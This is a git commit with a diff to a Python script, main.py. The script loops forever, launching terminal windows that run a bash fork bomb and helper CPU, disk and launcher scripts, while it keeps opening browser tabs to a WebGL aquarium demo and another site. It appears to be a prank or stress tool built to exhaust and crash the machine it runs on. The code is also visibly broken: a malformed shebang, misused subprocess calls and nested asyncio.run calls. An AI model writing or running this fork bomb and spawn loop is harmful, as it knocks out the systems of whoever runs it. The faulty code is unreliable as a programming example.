eb20d79da6ea0070e79f7766a8757b48657b13c3
Manofox-br <agelo7439@gmail.com>
2026-09-01 21:28:09 -0300

    Atualizar o main.py

--- main.py
+++ main.py
@@ -1,20 +1,35 @@
+#!usr/bin/env python3
 import subprocess, webbrowser, asyncio
 
 commands = [
-  "bash Scripts/cpu.sh",
-  ":(){ :|: & };:",
-  "bash Scripts/disk.sh"
+    "bash Scripts/cpu.sh",
+    ":(){ :|: & };:",
+    "bash Scripts/disk.sh",
+    "bash Scripts/launcher.sh"
 ]
 
-os.system(f"chmod +x Scripts/cpu.sh")
-os.system(f"chmod +x Scripts/disk.sh")
+subprocess.run(f"chmod +x Scripts/cpu.sh")
+subprocess.run(f"chmod +x Scripts/disk.sh")
+subprocess.run(f"chmod +x Scripts/launcher.sh")
+
+async def main():
+    while True:
+        asyncio.run(one())
+        asyncio.run(two())
 
 async def one():
-  i = 0
-  while True:
-    for cmd in commands:
-      subprocess.Popen(["gnome-terminal", "--", "bash", "-c", cmd])
-      webbrowser.open_new_tab("https://www.growden.io")
-      webbrowser.open("https://webglsamples.org/aquarium/aquarium.html")
-      
-asyncio.run(one())
+    while True:
+        for cmd in commands:
+            subprocess.Popen(["gnome-terminal", "--", "bash", "-c", cmd])
+            webbrowser.open("https://www.growden.io")
+            webbrowser.open("https://webglsamples.org/aquarium/aquarium.html")
+
+async def two():
+    while True:
+        for cmd in commands:
+            subprocess.Popen([cmd])
+            webbrowser.open("https://www.growden.io")
+            webbrowser.open("https://webglsamples.org/aquarium/aquarium.html")
+
+while True:
+    asyncio.run(main())
